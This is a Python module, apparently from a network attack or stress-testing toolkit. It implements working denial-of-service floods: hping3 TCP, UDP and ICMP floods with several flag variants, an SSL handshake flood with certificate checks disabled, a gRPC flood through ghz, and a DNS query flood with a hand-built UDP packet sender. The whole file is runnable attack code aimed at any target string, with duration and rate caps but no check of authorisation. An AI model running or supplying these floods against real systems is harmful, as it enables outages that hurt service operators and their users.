from __future__ import annotations

import asyncio
import json
import os
import socket
import ssl
import struct
import tempfile
import time

from ._base import _run_cmd, _tool_available
from .state import STATE


async def hping3_flood(
    target: str, port: int = 80, flood_type: str = "syn",
    duration_seconds: int = 10, extra_args: str = "",
) -> dict:
    if not _tool_available("hping3"):
        return {"error": "hping3 not installed — required for L4 attacks"}

    duration_seconds = min(duration_seconds, 60)
    flag_map = {
        "syn": ["-S", "--flood", "-p", str(port)],
        "udp": ["--udp", "--flood", "-p", str(port)],
        "icmp": ["--icmp", "--flood"],
        "ack": ["-A", "--flood", "-p", str(port)],
        "rst": ["-R", "--flood", "-p", str(port)],
        "xmas": ["-F", "-S", "-R", "-P", "-A", "-U", "--flood", "-p", str(port)],
        "fin": ["-F", "--flood", "-p", str(port)],
    }
    cmd = ["hping3"] + flag_map.get(flood_type, ["-S", "--flood", "-p", str(port)])
    if extra_args:
        cmd += extra_args.split()
    cmd.append(target)

    result = await _run_cmd(cmd, timeout=duration_seconds + 5)
    return {
        "target": target, "port": port, "flood_type": flood_type,
        "duration_seconds": duration_seconds,
        "raw_output": result.get("stdout", "")[:3000] + result.get("stderr", "")[:3000],
    }


async def ssl_handshake_flood(
    host: str, port: int = 443, connections: int = 200, duration_seconds: int = 30,
) -> dict:
    connections = min(connections, 500)
    duration_seconds = min(duration_seconds, 60)

    if _tool_available("thc-ssl-dos"):
        result = await _run_cmd(
            ["thc-ssl-dos", host, str(port), "--accept"],
            timeout=duration_seconds + 10,
        )
        return {
            "tool": "thc-ssl-dos", "host": host, "port": port,
            "stdout": result.get("stdout", "")[:3000],
            "exit_code": result.get("exit_code"),
        }

    completed = 0
    failed = 0
    stop_event = asyncio.Event()

    async def _handshake():
        nonlocal completed, failed
        while not stop_event.is_set():
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx), timeout=4,
                )
                completed += 1
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
            except Exception:
                failed += 1

    tasks = [asyncio.create_task(_handshake()) for _ in range(connections)]
    await asyncio.sleep(duration_seconds)
    stop_event.set()
    await asyncio.gather(*tasks, return_exceptions=True)

    return {
        "tool": "builtin_ssl_handshake", "host": host, "port": port,
        "concurrent_workers": connections,
        "handshakes_completed": completed, "handshakes_failed": failed,
        "rate_per_sec": round((completed + failed) / max(duration_seconds, 1), 1),
        "duration_seconds": duration_seconds,
        "install_hint": "apt install thc-ssl-dos for faster SSL flooding",
    }


async def grpc_flood(
    target: str, call: str = "", duration_seconds: int = 30, insecure: bool = True,
) -> dict:
    if not _tool_available("ghz"):
        return {"error": "ghz not installed", "hint": "go install github.com/bojand/ghz/cmd/ghz@latest"}

    duration_seconds = min(duration_seconds, 120)
    cmd = ["ghz", "--duration", f"{duration_seconds}s", "--format", "json"]
    if insecure:
        cmd.append("--insecure")
    if not call:
        cmd.append("--reflection")
    else:
        cmd += ["--call", call]
    cmd.append(target)

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    return {
        "tool": "ghz", "target": target, "call": call or "reflection",
        "duration_seconds": duration_seconds,
        "stdout": result.get("stdout", "")[:5000],
        "exit_code": result.get("exit_code"),
    }


async def dns_flood(
    target: str, query_type: str = "A", duration_seconds: int = 30, rate: int = 1000,
) -> dict:
    duration_seconds = min(duration_seconds, 60)
    rate = min(rate, 100000)

    if _tool_available("dnsperf"):
        query_data = f"{target} {query_type}\n" * 1000
        fd, qfile = tempfile.mkstemp(suffix=".txt")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(query_data)
            result = await _run_cmd(
                ["dnsperf", "-s", target, "-d", qfile, "-l", str(duration_seconds), "-Q", str(rate)],
                timeout=duration_seconds + 15,
            )
            return {
                "tool": "dnsperf", "target": target, "query_type": query_type,
                "rate": rate, "duration_seconds": duration_seconds,
                "stdout": result.get("stdout", "")[:3000],
            }
        finally:
            try:
                os.unlink(qfile)
            except Exception:
                pass

    hostname_encoded = b"".join(
        len(p).to_bytes(1, "big") + p.encode() for p in target.split(".")
    ) + b"\x00"
    qtype_map = {"A": 1, "AAAA": 28, "MX": 15, "NS": 2, "ANY": 255}

    def _build_query() -> bytes:
        txid = int(time.monotonic() * 1000) % 65535
        header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        question = hostname_encoded + struct.pack(">HH", qtype_map.get(query_type, 1), 1)
        return header + question

    sent = 0
    errors = 0
    stop = asyncio.Event()

    async def _flood_udp():
        nonlocal sent, errors
        try:
            loop = asyncio.get_running_loop()
            transport, _ = await loop.create_datagram_endpoint(
                asyncio.DatagramProtocol, remote_addr=(target, 53),
            )
            while not stop.is_set():
                try:
                    transport.sendto(_build_query())
                    sent += 1
                except Exception:
                    errors += 1
                await asyncio.sleep(1 / max(rate // 50, 1))
            transport.close()
        except Exception:
            errors += 1

    workers = [asyncio.create_task(_flood_udp()) for _ in range(min(50, rate // 100 + 1))]
    await asyncio.sleep(duration_seconds)
    stop.set()
    await asyncio.gather(*workers, return_exceptions=True)

    return {
        "tool": "builtin_udp_dns_flood", "target": target, "query_type": query_type,
        "duration_seconds": duration_seconds, "queries_sent": sent, "errors": errors,
        "rate_actual": round(sent / max(duration_seconds, 1), 1),
        "install_hint": "apt install dnsperf for professional DNS flood testing",
    }
